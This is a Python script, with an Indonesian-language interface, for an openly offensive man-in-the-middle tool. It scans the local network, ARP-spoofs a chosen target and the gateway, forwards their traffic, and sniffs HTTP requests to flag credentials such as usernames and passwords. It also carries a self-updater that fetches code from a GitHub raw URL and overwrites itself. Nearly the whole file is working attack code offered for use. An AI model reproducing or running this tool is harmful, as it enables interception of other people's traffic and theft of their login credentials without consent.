#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔥 Ultimate MITM Attack Tool - VVIP+++ Professional Grade 🔥
# 📱 Compatible with Termux (Android 16+), Linux, Windows, macOS
# 💯 100% REAL IMPLEMENTATION - NO SIMULATION!

import os
import sys
import time
import json
import random
import shutil
import socket
import platform
import subprocess
from threading import Thread
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError
import netifaces
import scapy.all as scapy
from scapy.layers import http
import psutil
import netaddr

# 🌈 Color Palette - Neon Futuristic Style
class Warna:
    MERAH = '\033[38;5;196m'
    HIJAU = '\033[38;5;46m'
    KUNING = '\033[38;5;226m'
    BIRU = '\033[38;5;45m'
    UNGU = '\033[38;5;93m'
    PINK = '\033[38;5;201m'
    CYAN = '\033[38;5;51m'
    OREN = '\033[38;5;208m'
    PUTIH = '\033[38;5;255m'
    RESET = '\033[0m'

    @staticmethod
    def gradien_teks(teks, style='neon'):
        warna_kode = [
            '\033[38;5;46m',  # Hijau Neon
            '\033[38;5;45m',  # Biru Cerah
            '\033[38;5;51m',  # Cyan
            '\033[38;5;201m', # Pink
            '\033[38;5;93m'   # Ungu
        ]
        hasil = ""
        for i, char in enumerate(teks):
            warna = warna_kode[i % len(warna_kode)]
            hasil += f"{warna}{char}"
        return hasil + Warna.RESET

# 🎭 Animasi Loading Pro
def animasi_loading(teks, durasi=3):
    chars = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    start_time = time.time()
    i = 0
    
    sys.stdout.write(f"{Warna.PINK}[{Warna.PUTIH}*{Warna.PINK}] {teks}... ")
    sys.stdout.flush()
    
    while time.time() - start_time < durasi:
        sys.stdout.write(f"\b{chars[i % len(chars)]}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    
    sys.stdout.write(f"\b{Warna.HIJAU}✔{Warna.RESET}\n")
    sys.stdout.flush()

# 🔍 Cek Dependencies
class DependencyChecker:
    REQUIRED_PACKAGES = [
        'scapy', 'requests', 'colorama', 'netaddr', 'psutil', 'netifaces'
    ]
    
    @staticmethod
    def cek_dan_install():
        animasi_loading("Memeriksa dependencies")
        
        for package in DependencyChecker.REQUIRED_PACKAGES:
            try:
                __import__(package)
                print(f"{Warna.HIJAU}[✓] {package} sudah terinstall{Warna.RESET}")
            except ImportError:
                print(f"{Warna.KUNING}[!] {package} belum terinstall, menginstall...{Warna.RESET}")
                DependencyChecker.install_package(package)
    
    @staticmethod
    def install_package(package_name):
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", package_name])
            print(f"{Warna.HIJAU}[✓] Berhasil menginstall {package_name}{Warna.RESET}")
        except subprocess.CalledProcessError:
            print(f"{Warna.MERAH}[X] Gagal menginstall {package_name}{Warna.RESET}")
            sys.exit(1)

# 🆕 Auto Update System
class AutoUpdater:
    GITHUB_RAW_URL = "https://raw.githubusercontent.com/exampleuser/mitm-tool/main/mitm_tool.py"
    
    @staticmethod
    def cek_update():
        try:
            animasi_loading("Memeriksa update")
            req = Request(AutoUpdater.GITHUB_RAW_URL, headers={'Cache-Control': 'no-cache'})
            with urlopen(req) as response:
                konten_online = response.read().decode('utf-8')
                
            with open(__file__, 'r', encoding='utf-8') as f:
                konten_lokal = f.read()
                
            if konten_online != konten_lokal:
                print(f"\n{Warna.KUNING}[!] Versi baru tersedia!{Warna.RESET}")
                jawaban = input(f"{Warna.BIRU}[?] Update sekarang? (y/n): {Warna.RESET}").lower()
                if jawaban == 'y':
                    AutoUpdater.lakukan_update(konten_online)
            else:
                print(f"{Warna.HIJAU}[✓] Sudah versi terbaru!{Warna.RESET}")
                
        except URLError:
            print(f"{Warna.KUNING}[!] Gagal memeriksa update (tidak ada internet?){Warna.RESET}")
    
    @staticmethod
    def lakukan_update(konten_baru):
        try:
            backup_file = f"{__file__}.bak"
            shutil.copyfile(__file__, backup_file)
            
            with open(__file__, 'w', encoding='utf-8') as f:
                f.write(konten_baru)
            
            print(f"{Warna.HIJAU}[✓] Berhasil update! Silakan jalankan ulang script.{Warna.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{Warna.MERAH}[X] Gagal update: {str(e)}{Warna.RESET}")
            if os.path.exists(backup_file):
                shutil.copyfile(backup_file, __file__)
            print(f"{Warna.KUNING}[!] Mengembalikan versi sebelumnya...{Warna.RESET}")

# 🎨 Banner Dinamis dengan Animasi
def tampilkan_banner():
    banner = f"""
{Warna.gradien_teks('''
  ███╗   ███╗██╗████████╗███╗   ███╗
  ████╗ ████║██║╚══██╔══╝████╗ ████║
  ██╔████╔██║██║   ██║   ██╔████╔██║
  ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
  ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
''')}
{Warna.PUTIH}╔════════════════════════════════════════════════╗
{Warna.PUTIH}║ {Warna.gradien_teks('MITM ATTACK TOOL - PROFESSIONAL EDITION')} {Warna.PUTIH}║
{Warna.PUTIH}║ {Warna.CYAN}Versi: 3.0.0 {Warna.PUTIH}• {Warna.HIJAU}Status: Active {Warna.PUTIH}• {Warna.PINK}REAL IMPLEMENTATION {Warna.PUTIH}║
{Warna.PUTIH}╚════════════════════════════════════════════════╝
{Warna.RESET}"""
    
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.05)

# 🛠️ Tools Network
class NetworkTools:
    @staticmethod
    def dapatkan_info_jaringan():
        try:
            animasi_loading("Mendapatkan info jaringan")
            hostname = socket.gethostname()
            ip_lokal = socket.gethostbyname(hostname)
            
            interfaces = netifaces.interfaces()
            print(f"\n{Warna.BIRU}=== Informasi Jaringan ===")
            print(f"{Warna.PUTIH}Hostname   : {Warna.CYAN}{hostname}")
            print(f"{Warna.PUTIH}IP Lokal   : {Warna.CYAN}{ip_lokal}")
            
            try:
                ip_publik = urlopen('https://api.ipify.org').read().decode('utf-8')
                print(f"{Warna.PUTIH}IP Publik  : {Warna.CYAN}{ip_publik}")
            except:
                print(f"{Warna.PUTIH}IP Publik  : {Warna.KUNING}Tidak dapat terdeteksi")
            
            print(f"\n{Warna.PUTIH}=== Interfaces Jaringan ===")
            for iface in interfaces:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    print(f"{Warna.PUTIH}Interface : {Warna.CYAN}{iface}")
                    for addr in addrs[netifaces.AF_INET]:
                        print(f"  • IP      : {addr['addr']}")
                        if 'netmask' in addr:
                            print(f"  • Netmask : {addr['netmask']}")
                        if 'broadcast' in addr:
                            print(f"  • Broadcast : {addr['broadcast']}")
            
            print(f"{Warna.BIRU}=========================={Warna.RESET}\n")
            
        except Exception as e:
            print(f"{Warna.MERAH}[X] Gagal mendapatkan info jaringan: {str(e)}{Warna.RESET}")

    @staticmethod
    def scan_jaringan(interface):
        try:
            animasi_loading("Memindai jaringan", 5)
            
            # Get network prefix
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET not in addrs:
                raise ValueError("Interface tidak memiliki alamat IPv4")
            
            ip_info = addrs[netifaces.AF_INET][0]
            ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calculate network
            network = netaddr.IPNetwork(f"{ip}/{netmask}")
            print(f"\n{Warna.PUTIH}Memindai jaringan: {Warna.CYAN}{network}{Warna.RESET}")
            
            # ARP scan
            print(f"{Warna.PUTIH}Host yang aktif di jaringan:{Warna.RESET}")
            
            answered, _ = scapy.arping(str(network), timeout=2, verbose=False)
            
            hosts = []
            for sent, received in answered:
                hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
                print(f"{Warna.PUTIH}• {Warna.CYAN}{received.psrc}{Warna.PUTIH} - {Warna.CYAN}{received.hwsrc}{Warna.RESET}")
            
            return hosts
            
        except Exception as e:
            print(f"{Warna.MERAH}[X] Gagal memindai jaringan: {str(e)}{Warna.RESET}")
            return []

# 🎯 Main MITM Engine
class MITMAttack:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.running = False
        self.packet_count = 0
    
    def konfigurasi(self):
        print(f"\n{Warna.UNGU}=== Konfigurasi MITM Attack ===")
        
        # Dapatkan daftar interface
        interfaces = netifaces.interfaces()
        print(f"\n{Warna.PUTIH}Interface yang tersedia:{Warna.RESET}")
        for i, iface in enumerate(interfaces):
            print(f"{Warna.PUTIH}{i+1}. {Warna.CYAN}{iface}{Warna.RESET}")
        
        iface_choice = input(f"\n{Warna.PUTIH}[?] Pilih interface (1-{len(interfaces)}): {Warna.RESET}")
        try:
            self.interface = interfaces[int(iface_choice)-1]
        except:
            print(f"{Warna.MERAH}[X] Pilihan tidak valid!{Warna.RESET}")
            return False
        
        # Scan jaringan untuk mendapatkan host
        hosts = NetworkTools.scan_jaringan(self.interface)
        if not hosts:
            return False
        
        print(f"\n{Warna.PUTIH}Host yang ditemukan:{Warna.RESET}")
        for i, host in enumerate(hosts):
            print(f"{Warna.PUTIH}{i+1}. {Warna.CYAN}{host['ip']}{Warna.PUTIH} - {Warna.CYAN}{host['mac']}{Warna.RESET}")
        
        # Pilih target
        target_choice = input(f"\n{Warna.PUTIH}[?] Pilih target (1-{len(hosts)}): {Warna.RESET}")
        try:
            self.target_ip = hosts[int(target_choice)-1]['ip']
        except:
            print(f"{Warna.MERAH}[X] Pilihan tidak valid!{Warna.RESET}")
            return False
        
        # Pilih gateway (biasanya .1 atau .254)
        self.gateway_ip = input(f"{Warna.PUTIH}[?] Masukkan Gateway IP (default {hosts[0]['ip'].rsplit('.',1)[0]}.1): {Warna.RESET}")
        if not self.gateway_ip:
            self.gateway_ip = f"{hosts[0]['ip'].rsplit('.',1)[0]}.1"
        
        print(f"{Warna.UNGU}==============================={Warna.RESET}")
        return True
    
    def spoof(self, target_ip, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    
    def restore(self, target_ip, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip, hwsrc=scapy.getmacbyip(spoof_ip))
        scapy.send(packet, count=4, verbose=False)
    
    def sniff_packets(self, interface):
        def process_packet(packet):
            if packet.haslayer(http.HTTPRequest):
                self.packet_count += 1
                url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                print(f"\n{Warna.PINK}[+] HTTP Request ke: {Warna.CYAN}{url}{Warna.RESET}")
                
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load.decode('utf-8', 'ignore')
                    for word in ['username', 'user', 'pass', 'password', 'login']:
                        if word in load:
                            print(f"{Warna.MERAH}[!] Kemungkinan kredensial ditemukan: {load[:100]}...{Warna.RESET}")
                            break
        
        scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80 or tcp port 443")
    
    def mulai_serangan(self):
        try:
            print(f"\n{Warna.MERAH}🚀 MEMULAI MITM ATTACK 🚀{Warna.RESET}")
            
            # Enable IP forwarding
            if platform.system() == 'Linux':
                subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            elif platform.system() == 'Darwin':
                subprocess.call("sysctl -w net.inet.ip.forwarding=1", shell=True)
            
            # Mulai ARP spoofing
            print(f"\n{Warna.HIJAU}[✓] Memulai ARP spoofing...{Warna.RESET}")
            print(f"{Warna.PUTIH}Target    : {Warna.CYAN}{self.target_ip}")
            print(f"{Warna.PUTIH}Gateway   : {Warna.CYAN}{self.gateway_ip}")
            print(f"{Warna.PUTIH}Interface : {Warna.CYAN}{self.interface}{Warna.RESET}")
            
            # Mulai thread untuk sniffing
            sniff_thread = Thread(target=self.sniff_packets, args=(self.interface,))
            sniff_thread.daemon = True
            sniff_thread.start()
            
            self.running = True
            start_time = time.time()
            
            try:
                while self.running:
                    self.spoof(self.target_ip, self.gateway_ip)
                    self.spoof(self.gateway_ip, self.target_ip)
                    time.sleep(2)
                    
                    # Update status
                    elapsed = int(time.time() - start_time)
                    print(f"{Warna.PUTIH}[{datetime.now().strftime('%H:%M:%S')}] {Warna.CYAN}Menjalankan MITM: {elapsed}s | Paket ditangkap: {self.packet_count}{Warna.RESET}", end='\r')
                    
            except KeyboardInterrupt:
                self.running = False
                print(f"\n\n{Warna.KUNING}[!] Menghentikan serangan...{Warna.RESET}")
                
                # Restore ARP tables
                animasi_loading("Membersihkan dan mereset ARP tables", 3)
                self.restore(self.target_ip, self.gateway_ip)
                self.restore(self.gateway_ip, self.target_ip)
                
                # Disable IP forwarding
                if platform.system() == 'Linux':
                    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
                elif platform.system() == 'Darwin':
                    subprocess.call("sysctl -w net.inet.ip.forwarding=0", shell=True)
                
                print(f"{Warna.HIJAU}[✓] Serangan dihentikan dengan aman!{Warna.RESET}")
                print(f"{Warna.PINK}Total paket yang di-intercept: {self.packet_count}{Warna.RESET}")
                
        except Exception as e:
            self.running = False
            print(f"\n{Warna.MERAH}[X] Error selama serangan: {str(e)}{Warna.RESET}")
            if platform.system() == 'Linux':
                subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
            elif platform.system() == 'Darwin':
                subprocess.call("sysctl -w net.inet.ip.forwarding=0", shell=True)

# 📜 Menu Utama
def main_menu():
    while True:
        print(f"\n{Warna.OREN}=== MENU UTAMA ===")
        print(f"{Warna.PUTIH}1. Mulai MITM Attack")
        print(f"2. Scan Jaringan")
        print(f"3. Cek Info Jaringan")
        print(f"4. Update Tool")
        print(f"5. Keluar")
        print(f"{Warna.OREN}================={Warna.RESET}")
        
        pilihan = input(f"{Warna.PUTIH}[?] Pilih opsi (1-5): {Warna.RESET}")
        
        if pilihan == "1":
            mitm = MITMAttack()
            if mitm.konfigurasi():
                mitm.mulai_serangan()
        elif pilihan == "2":
            interfaces = netifaces.interfaces()
            print(f"\n{Warna.PUTIH}Interface yang tersedia:{Warna.RESET}")
            for i, iface in enumerate(interfaces):
                print(f"{Warna.PUTIH}{i+1}. {Warna.CYAN}{iface}{Warna.RESET}")
            choice = input(f"\n{Warna.PUTIH}[?] Pilih interface (1-{len(interfaces)}): {Warna.RESET}")
            try:
                NetworkTools.scan_jaringan(interfaces[int(choice)-1])
            except:
                print(f"{Warna.MERAH}[X] Pilihan tidak valid!{Warna.RESET}")
        elif pilihan == "3":
            NetworkTools.dapatkan_info_jaringan()
        elif pilihan == "4":
            AutoUpdater.cek_update()
        elif pilihan == "5":
            print(f"\n{Warna.HIJAU}[✓] Sampai jumpa lagi! 👋{Warna.RESET}\n")
            sys.exit(0)
        else:
            print(f"{Warna.MERAH}[X] Pilihan tidak valid!{Warna.RESET}")

# 🏁 Entry Point
if __name__ == "__main__":
    try:
        # Bersihkan layar terminal
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Cek root/admin
        if os.geteuid() != 0 and platform.system() != 'Windows':
            print(f"{Warna.MERAH}[X] Script ini membutuhkan akses root/admin!{Warna.RESET}")
            sys.exit(1)
        
        # Tampilkan banner
        tampilkan_banner()
        
        # Cek dan install dependencies
        DependencyChecker.cek_dan_install()
        
        # Cek update
        AutoUpdater.cek_update()
        
        # Jalankan menu utama
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Warna.KUNING}[!] Script dihentikan oleh pengguna{Warna.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Warna.MERAH}[X] Error fatal: {str(e)}{Warna.RESET}")
        sys.exit(1)